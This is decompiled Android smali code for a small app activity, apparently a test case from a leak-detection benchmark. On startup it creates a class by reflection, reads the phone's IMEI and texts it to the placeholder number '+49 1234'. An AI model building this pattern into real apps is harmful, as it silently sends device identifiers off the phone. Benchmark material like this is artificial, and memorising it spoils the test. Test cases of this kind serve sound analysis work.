.class public Lde/ecspride/MainActivity;
.super Landroid/app/Activity;
.source "MainActivity.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 10
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 9
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .prologue
    .line 14
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 15
    const/high16 v1, 0x7f030000

    invoke-virtual {p0, v1}, Lde/ecspride/MainActivity;->setContentView(I)V

    .line 18
    :try_start_0
    const-string v1, "de.ecspride.ConcreteClass"

    invoke-static {v1}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Class;->newInstance()Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Lde/ecspride/BaseClass;

    .line 19
    .local v6, "bc":Lde/ecspride/BaseClass;
    const-string v1, "phone"

    invoke-virtual {p0, v1}, Lde/ecspride/MainActivity;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v8

    check-cast v8, Landroid/telephony/TelephonyManager;

    .line 20
    .local v8, "telephonyManager":Landroid/telephony/TelephonyManager;
    invoke-virtual {v8}, Landroid/telephony/TelephonyManager;->getDeviceId()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v6, Lde/ecspride/BaseClass;->imei:Ljava/lang/String;

    .line 22
    invoke-static {}, Landroid/telephony/SmsManager;->getDefault()Landroid/telephony/SmsManager;

    move-result-object v0

    .line 23
    .local v0, "sms":Landroid/telephony/SmsManager;
    const-string v1, "+49 1234"

    const/4 v2, 0x0

    iget-object v3, v6, Lde/ecspride/BaseClass;->imei:Ljava/lang/String;

    const/4 v4, 0x0

    const/4 v5, 0x0

    invoke-virtual/range {v0 .. v5}, Landroid/telephony/SmsManager;->sendTextMessage(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V
    :try_end_0
    .catch Ljava/lang/InstantiationException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/lang/IllegalAccessException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/ClassNotFoundException; {:try_start_0 .. :try_end_0} :catch_2

    .line 34
    .end local v0    # "sms":Landroid/telephony/SmsManager;
    .end local v6    # "bc":Lde/ecspride/BaseClass;
    .end local v8    # "telephonyManager":Landroid/telephony/TelephonyManager;
    :goto_0
    return-void

    .line 24
    :catch_0
    move-exception v7

    .line 26
    .local v7, "e":Ljava/lang/InstantiationException;
    invoke-virtual {v7}, Ljava/lang/InstantiationException;->printStackTrace()V

    goto :goto_0

    .line 27
    .end local v7    # "e":Ljava/lang/InstantiationException;
    :catch_1
    move-exception v7

    .line 29
    .local v7, "e":Ljava/lang/IllegalAccessException;
    invoke-virtual {v7}, Ljava/lang/IllegalAccessException;->printStackTrace()V

    goto :goto_0

    .line 30
    .end local v7    # "e":Ljava/lang/IllegalAccessException;
    :catch_2
    move-exception v7

    .line 32
    .local v7, "e":Ljava/lang/ClassNotFoundException;
    invoke-virtual {v7}, Ljava/lang/ClassNotFoundException;->printStackTrace()V

    goto :goto_0
.end method

.method public onCreateOptionsMenu(Landroid/view/Menu;)Z
    .locals 2
    .param p1, "menu"    # Landroid/view/Menu;

    .prologue
    .line 39
    invoke-virtual {p0}, Lde/ecspride/MainActivity;->getMenuInflater()Landroid/view/MenuInflater;

    move-result-object v0

    const/high16 v1, 0x7f070000

    invoke-virtual {v0, v1, p1}, Landroid/view/MenuInflater;->inflate(ILandroid/view/Menu;)V

    .line 40
    const/4 v0, 0x1

    return v0
.end method
